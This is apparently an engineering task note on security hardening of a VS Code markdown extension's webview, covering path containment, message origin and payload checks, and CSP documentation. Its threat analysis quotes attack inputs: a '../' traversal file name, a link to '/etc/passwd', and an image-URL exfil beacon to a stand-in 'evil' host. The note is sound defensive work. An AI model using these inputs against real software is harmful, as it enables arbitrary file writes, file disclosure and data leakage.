# Task 148 — Webview security hardening (path containment + defense-in-depth)

> **Status:** 🟢 ALL FOUR ITEMS NOW ADDRESSED — items 1, 2, 4 DONE; item 3 (both the
> payload-shape-validation half AND the origin-check half) is now DONE, the latter as a deliberate
> **warn-only** log rather than a drop — see below for the full measurement + reasoning. Item 4 was
> found already-satisfied by an earlier unrelated task (185/3i), just never marked closed here.
> Created 2026-06-24 from a security review of the webview attack surface (untrusted `.md` →
> render / host commands). Security.
> **Source:** architecture review (2026-06-24); status re-verified 2026-07-27 (Codex architecture review).
> **Value / Risk:** 🟢 closes two real path/file sinks + documents the accepted CSP tradeoffs / low —
> input validation + a CSP comment, no behavioural change for legitimate use.
>
> **🟢 Item 1 DONE — verified 2026-07-27 against the current source:** `onUpload` now reduces
> `file.name` to a bare basename and asserts containment before writing
> (`src/extension.ts:781-783`: `NodePath.basename(String(file.name))` → `NodePath.join(assetsFolder, …)`
> → `NodePath.relative(assetsFolder, target)` containment check). The traversal write is closed.
>
> **🟢 Item 2 DONE (2026-07-27):** `onOpenLink` now contains the resolved target to the workspace
> folder (`this.workspaceFolder?.uri.fsPath`) — or the document's own directory when there is no
> workspace — before opening, mirroring `onUpload`'s pattern (`src/extension.ts`, `onOpenLink`).
> TDD (RED→GREEN, `test/backend/open-link.test.ts`, 6 tests: same-workspace relative link, a `../`
> that still resolves inside the workspace, a `../../../` escape refused, an absolute-path escape
> refused, http(s) links unaffected, and the no-workspace fallback). Verified: 6/6 new + full unit
> suite 1790/1790, typecheck clean, `lint:ci` clean, coverage ratchet OK (30/30). **No real-VS-Code
> e2e** — following item 1's own precedent in this same task (also host-side containment logic
> verified only at the backend/unit level, no dedicated e2e), since this is extension-host path
> logic, not webview rendering behaviour.
>
> **🟢 Item 3, origin-check half DONE (2026-07-28) — implemented as WARN-ONLY, not a drop.**
> Full account below because the reasoning matters more than the diff for this one.
>
> **What was measured, empirically, before any code was written:**
> `test/vscode-e2e/webview-message-origin-probe.spec.ts` — a diagnostic e2e (installs a SECOND
> `window.addEventListener('message', …)` inside the real webview purely to observe; production's
> own listener untouched) run against real desktop VS Code under xvfb. Captured `e.origin` +
> `e.source` shape across three deliberately-chosen phases: (a) multiple messages within one
> session, (b) a fully disposed-and-recreated webview for the same document, (c) a second,
> independent panel for a different document open at the same time. Result: **24/24 captured
> messages, exactly ONE distinct origin
> (`vscode-webview://1vrkj7r4q6heokd461f2g0akaioa0ktgrarlq1vepc77n159hp64`) and exactly ONE
> distinct `e.source` shape** (non-null, non-`window`, `typeof 'object'`) across all three phases.
> **Secondary, incidental evidence** (from a first attempt's retries, each a separate VS Code
> launch, not a deliberately-designed phase): three DIFFERENT origin tokens across three launches —
> confirming the random subdomain is per-launch, never a fixed constant to hardcode.
>
> **Conclusion from the measurement alone:** within one running desktop-VS-Code instance, the
> origin is stable across panel recreation and multiple simultaneous panels — a **scheme-level**
> pattern check (`vscode-webview://…`, never the token) would not misfire there.
>
> **But the decisive constraint the e2e harness itself could never surface:** `package.json`
> declares `"extensionKind": ["workspace"]` and `"virtualWorkspaces": { "supported": "limited" }` —
> vMarkd also runs in **browser-hosted VS Code** (Codespaces, github.dev-style hosts), an
> environment this repo's e2e harness cannot launch. There, the webview is a real browser tab and
> the origin is **not** `vscode-webview://` at all — it is an `https://…vscode-cdn.net`-family
> origin instead. A DROP built on the desktop-measured pattern would silently reject **every**
> host→webview message in that untested environment: the editor would open and then sit inert — no
> theme, no config, no content updates, no error anywhere. That is precisely the catastrophic
> silent failure this task has been deliberately parked on all session (getting the origin string
> wrong is worse than the low-risk gap the check closes), just relocated to an environment nobody
> here could measure.
>
> **Decision: implement as WARN-ONLY.** `media-src/src/message-router.ts`'s `installMessageRouter`
> now logs (via the existing `logToHost`, rate-limited to ONCE per webview session — a closure-
> scoped flag, not per-message) when `e.origin` doesn't match `/^vscode-webview:\/\//`, and then
> **dispatches the message regardless, unconditionally.** This buys the real value (an unexpected
> origin becomes a visible Output-channel signal instead of nothing) at zero risk of bricking an
> environment this repo cannot test. TDD: added 3 tests to `media-src/src/message-router.test.ts`
> in a dedicated describe block using a fresh `EventTarget` per test (not the shared jsdom `window`
> other blocks in the file use, which accumulates listeners across tests and would have polluted
> the exact-call-count assertions this rate-limiting behaviour needs) — warns exactly once across 3
> dispatched messages with a bad origin while still dispatching all 3; does not warn for a
> `vscode-webview://` origin; never blocks dispatch even for a Codespaces-shaped
> `https://…vscode-cdn.net` origin. Verified TDD rigor retroactively: temporarily reverted the
> implementation, confirmed the "warns once" test failed for the right reason (0 warnings captured,
> not a wrong count), restored, confirmed green. Also fixed two PRE-EXISTING tests in the same file
> that would have broken for an unrelated reason — they asserted `logToHost` not called at all for
> a fully valid message, but jsdom's synthesized `MessageEvent` defaults `origin` to `""` when not
> specified, which now (correctly) trips the origin warning; gave them an explicit
> `origin: 'vscode-webview://test-instance'` since that's what a real message actually carries.
>
> **Verified:** `media-src/src/message-router.test.ts` 25/25 (up from 15 at session start); full
> `npm test` 1919/1919; `npm run typecheck` clean; scoped `biome check` on the touched files clean;
> whole-tree `lint:ci` clean except one pre-existing, unrelated error in
> `media-src/src/custom-diagrams.ts` (confirmed by team-lead as task 409's in-flight churn, not
> this change); coverage — the Istanbul HTML report confirms every new origin-check line is hit;
> `check:coverage-modules` ratchet OK, 28/28, unaffected. **No dedicated e2e for the warn-only
> code path itself** — per team-lead's call, the existing dispatcher unit tests cover it, and the
> e2e slot was correctly spent on the origin *measurement* instead (a question no unit test could
> have answered).
>
> **Explicit follow-up condition, so this isn't a permanent half-measure by default:** tighten the
> warn to a drop **only** once this warning has been observed quiet across real desktop VS Code,
> remote/SSH VS Code, and a genuine browser-hosted (Codespaces) session — i.e., once someone has
> actually run vMarkd in a Codespace and confirmed either (a) the warning never fires there (meaning
> the origin pattern needs broadening first) or (b) a broadened pattern that covers the
> `vscode-cdn.net` shape too has itself been measured stable the same way the desktop origin was
> here. Getting to "drop" without that evidence is the exact trade this task refused all session;
> don't take it later without doing the same homework.
>
> **🟢 Item 3, payload-shape-validation half, WEBVIEW SIDE DONE (2026-07-28):** lightweight
> discriminant + required-field check added to `installMessageRouter`
> (`media-src/src/message-router.ts`) — a table of `[fieldName, 'string'|'number'|'array']` per
> `HostMessage` command (derived directly from `src/protocol.ts`'s `HostMessage` union, listing
> only the fields each `handleXxx` unconditionally reads), checked after the "unknown command"
> branch and before dispatch. A shape violation is routed through the SAME `logToHost` the
> unhandled-command branch already uses (never throws), naming both the command and the bad field.
> TDD: 4 new tests in `media-src/src/message-router.test.ts` written first against the
> unimplemented code (confirmed the 2 shape-violation tests failed for the right reason — handler
> mocks WERE called with the malformed data — before implementing); green after. Verified:
> `media-src/src/message-router.test.ts` 15/15; full `npm test` 1865/1865; `npm run typecheck`
> clean; scoped `biome check` on the two edited files clean; coverage confirmed via the Istanbul
> HTML report that every new line (the field table, `matchesFieldType`, `firstShapeViolation`, both
> new dispatch branches) is hit (`cline-yes`) — the file's overall 50% line coverage is pre-existing
> in handler bodies my tests don't drive, not in the new validation code; `check:coverage-modules`
> ratchet unaffected (28/28 baseline).
>
> **🟡 Item 3, payload-shape-validation half, HOST SIDE — validator written, NOT yet wired in:**
> the actual check (`firstWebviewMessageShapeViolation`, mirroring `message-router.ts`'s own
> function for the opposite direction) lives in a new standalone module,
> `src/webview-message-shape.ts`, with its own test (`test/backend/webview-message-shape.test.ts`,
> 7 tests, TDD — written against the not-yet-existing module first, confirmed the import failed for
> the right reason, then implemented). Its field table was built by reading the REAL
> `buildMessageHandlers()` bodies (`extension.ts`) and `asset-link-actions.ts` (task 405 extracted
> `onUpload`/`onOpenLink`/`onOpenWikilink` there), not inferred from `protocol.ts`'s types — several
> fields the type marks non-optional are deliberately NOT required here because the handler already
> defends them (`docMode`'s `Number()`/`Boolean()` coercions, `log`/`copy-html`/`copy-markdown`'s
> `?? ''` fallback, `save-options`' `sanitizeVditorOptions` being built to tolerate any shape) — see
> the module's header comment for the full per-command reasoning.
>
> **🟢 Item 3, payload-shape-validation half, HOST SIDE now WIRED IN too (2026-07-28):** team-lead
> granted a bounded, exclusive edit window. **Note the target file moved out from under the original
> plan** — the shifting-tsc-errors observation above turned out to be task 405 completing its own
> deferred "move `EditorSession`/`MarkdownEditorProvider` out of `extension.ts`" item live, mid-edit.
> By the time the window opened, `onDidReceiveMessage`/`buildMessageHandlers` had relocated to the
> new `src/editor-session.ts` (extension.ts: 1080 → 147 lines; `MarkdownEditorProvider` moved to its
> own `src/markdown-editor-provider.ts`, both re-exported from `extension.ts` so existing imports/
> tests didn't need to change). Wired the check there instead — same dispatcher, same shape, just a
> different file — one call to `firstWebviewMessageShapeViolation` between the existing "no handler"
> branch and the `try { await handler(message) }` call, logging through the SAME `debug(...)` the
> unhandled-command branch already used. No other restructuring touched, per the bounded-edit ask.
>
> TDD: added 3 tests to `test/backend/extension.test.ts` (new describe block
> `onDidReceiveMessage — payload shape validation`). First attempt at test 1 used `upload` with a
> missing `files` — ran it and it passed EVEN BEFORE implementing anything, because `onUpload`
> already throws on a missing array and the PRE-EXISTING try/catch error boundary (task 151 item 2)
> already logs `message?.command` on any handler failure — so that test wasn't actually exercising
> the new check at all, just the old one. Caught it, switched to `save-outline-width` (writes
> `message.width` straight into `globalState` with **no** coercion and **no** throw either way —
> `update(key, undefined)` succeeds silently), re-ran against the unimplemented code, got the real
> RED (`expected true to be false` — the update WAS happening), then implemented, then green.
> Verified: `test/backend/extension.test.ts` + `test/backend/webview-message-shape.test.ts` 49/49;
> full `npm test` 1882/1882; host `tsc -p tsconfig.json --noEmit` clean; `node build.mjs` clean;
> `npm run lint:ci` (whole tree) clean, 532 files; coverage — `webview-message-shape.ts` 100%
> lines/branches/functions, and the Istanbul HTML report confirms every new line in
> `editor-session.ts` (the check call + both branches) is hit; `check:coverage-modules` ratchet OK,
> 28/28 baseline, unaffected.
>
> Item 4 (document `unsafe-eval`'s CSP necessity) — separately already ✅ DONE, see below.

## Threat model
A `.md` file is semi-trusted (VS Code Workspace Trust). The webview renders its content; some actions
(link click, image paste) post messages to the extension host, which performs file/command operations.
The review traced: CSP, every `innerHTML` sink, `eval`/WASM, host message handlers, and exfil channels.

## What's already strong (do NOT regress)
- **CSP baseline:** `default-src 'none'`, `object-src 'none'`, `frame-src 'none'`, `base-uri` locked
  (`src/html-builder.ts:40-49`).
- **`script-src` has a nonce and NO `'unsafe-inline'`** — this is load-bearing: it neutralizes every
  `innerHTML` sink (`custom-diagrams.ts:245/327` `svgStr`, `stream-render.ts:99`,
  `wysiwyg-code-highlight.ts:243`). A `<script>` or `onload=` injected via malicious diagram source
  won't execute. This is what makes the `innerHTML` usage acceptable.
- **No `eval`/`new Function` on untrusted content** (verified across `media-src/src`).
- **`connect-src` has no `https:`** → fetch/XHR/WebSocket exfil is blocked even when remote images are
  allowed. Good layering.
- **Wikilinks** resolve by key against a root-contained cache (`onOpenWikilink`), not raw path-join.

## Findings → work items (by severity)

### 1. ✅ DONE (verified 2026-07-27) — Path-traversal file WRITE in `onUpload`
`extension.ts:1014`: `fs.writeFile(Uri.file(NodePath.join(assetsFolder, file.name)), content)`.
`file.name` comes from the webview message and is **not sanitized** — no `basename`, no `..` strip, no
containment check. `file.name = "../../../<somewhere>"` escapes `assetsFolder` → arbitrary write.
`ensureCanWriteFiles` only gates *whether* writing is allowed (untitled/remote), not the path.
- **Fix:** `NodePath.basename(file.name)` (drop any directory component) AND assert the resolved
  target stays under `assetsFolder` (`resolved.startsWith(assetsFolder + sep)`); reject otherwise.
  Also reject empty/`.`/`..` names.

### 2. 🟠 Arbitrary local-file open via an untrusted link
`extension.ts:1040-1041`: the non-http branch does `NodePath.resolve(dirname(activeFsPath), href)` →
`vscode.open` with no workspace/doc-dir containment. `[x](/etc/passwd)` or `[x](../../../secret)`
opens any file on disk in the editor on click (information disclosure, not code-exec).
- **Fix:** contain the resolved target to the document dir / workspace; for out-of-scope targets,
  either refuse or confirm with the user. Keep the `^https?:` → `openExternal` branch as-is (it's the
  only branch that `Uri.parse`s the raw href, and it's correctly scheme-gated).

### 3. ✅ DONE (2026-07-28) — Webview message handler now validates `e.origin`/`e.source` (warn-only) and the payload SHAPE
`media-src/src/message-router.ts` (moved out of `main.ts:1312` by task 399, unchanged in
substance): `messageHandlers[msg?.command]?.(msg)` runs on any `message` event.
Low risk given `frame-src 'none'` + no `unsafe-inline` script, but an origin check is cheap
defense-in-depth.
- **Fix:** verify `e.origin` is the expected `vscode-webview://…` origin before dispatching.
  **Done, as WARN-ONLY, not a drop** — measured empirically first
  (`test/vscode-e2e/webview-message-origin-probe.spec.ts`) exactly as this note required, then
  implemented as a rate-limited log (never a drop) once the measurement + `package.json`'s declared
  browser-hosted/Codespaces support together ruled out a safe drop — full reasoning, the raw
  measured values, and the explicit tighten-to-a-drop condition are in the status block at the top
  of this file.
- **Added 2026-07-27 (Codex architecture review):** the same dispatch has no **runtime payload
  validation** either. [Task 151](151-typed-failloud-boundary.md) made the `HostMessage` /
  `WebviewMessage` unions real and typed both handler maps — but TypeScript checks internal
  *callers*, not what actually arrives on the wire, so a malformed or drifted message is a runtime
  shape error inside a handler rather than a rejection at the seam. Add a lightweight discriminant +
  required-field check at **both** dispatchers (webview `message-router.ts`, host
  `extension.ts` `onDidReceiveMessage`), routed to the existing unhandled-command logging rather
  than throwing. Deliberately lightweight — a schema library is not warranted for a trusted-ish
  same-process seam; the value is turning silent shape drift into an Output-channel signal.
  Belongs here (this is the boundary-hardening task) rather than in 151, which is about types.
  **Both halves DONE (2026-07-28):** webview side in `media-src/src/message-router.ts`; host side
  in `src/webview-message-shape.ts` (the pure validator) wired into `src/editor-session.ts`'s
  `onDidReceiveMessage` (the dispatcher moved out of `extension.ts` mid-session by task 405's own
  deferred-item completion — see the status block above for the full account of both halves, TDD,
  tests, coverage).

### 4. ✅ DONE (found already-satisfied 2026-07-27) — Document why `unsafe-eval` is in the CSP
`script-src … 'unsafe-eval'` (`html-builder.ts:46`) is required by the **D2 WASM** bootstrap
(`wasm_exec.js` uses `Function()`); we verified nothing evals markdown. It's an accepted necessity,
but undocumented at the CSP site → risk of someone widening it blindly later.
- **Resolved by a different task (185/3i), never closed out here:** `src/html-builder.ts:75-79`
  now carries exactly this comment — names the actual consumers (wavedrom's relaxed-JSON `eval()`,
  vega-embed's expression compiler, three.js), states that `'wasm-unsafe-eval'` alone was tried and
  **empirically broke the renderers in the real-VS-Code suite**, and gives the re-narrowing
  condition (only if wavedrom/vega gain strict-parse modes). This exceeds what this item asked
  for — it's not just documented, the narrower alternative was actually tested and found
  insufficient, not merely "evaluated" on paper.
- **Fix (original, superseded above):** a comment at the directive naming the single consumer (WASM); evaluate whether
  `'wasm-unsafe-eval'` alone suffices in the VS Code webview (narrower) with `'unsafe-eval'` as the
  fallback — verify in the real webview, don't assume.

### 5. ⚪ `img-src https:` under `allowRemoteImages` is the one exfil channel — already opt-in
A remote image (`![](https://evil/?leak=…)`) is a tracking/exfil beacon, but only when
`vmarkd.image.allowRemoteImages` is on (default off) — correct design. No change; recorded so the
default is never silently flipped. (`connect-src` stays remote-free regardless — keep it that way.)

## Tests (per AGENTS)
- **unit** (host) — `onUpload` rejects/sanitizes `file.name` with `..`, absolute, and empty values
  (asserts the write target stays under `assetsFolder`); `onOpenLink` refuses/contains an
  out-of-workspace `href`.
- **unit** (webview) — `media-src/src/message-router.test.ts`: the message handler logs (once,
  rate-limited) but still DISPATCHES a `message` event from an unexpected origin (#3, warn-only by
  design — see the status block); a lightweight payload-shape check drops a malformed known-command
  message before it reaches its handler, on both the webview (`message-router.ts`) and host
  (`webview-message-shape.ts` wired into `editor-session.ts`) dispatchers.
- **e2e** (real VS Code) — `test/vscode-e2e/webview-message-origin-probe.spec.ts`: a diagnostic
  MEASUREMENT spec (not a permanent regression test) that captured the real `e.origin`/`e.source`
  desktop VS Code sends, informing the warn-only decision above.

## See also
- `src/html-builder.ts` (CSP), `src/extension.ts` (`onUpload`, `onOpenLink`, `onOpenWikilink`,
  `ensureCanWriteFiles`), `media-src/src/main.ts:1312` (message handler), `media-src/src/custom-diagrams.ts`
  (the `innerHTML` SVG sinks the no-`unsafe-inline` CSP protects).
- Memory: "innerHTML Sinks in Renderers" (post-process SVG, not raw markdown). Task 67 (image-trust
  gate / `allowRemoteImages`), task 87 (`object-src 'none'` killed remote PlantUML).
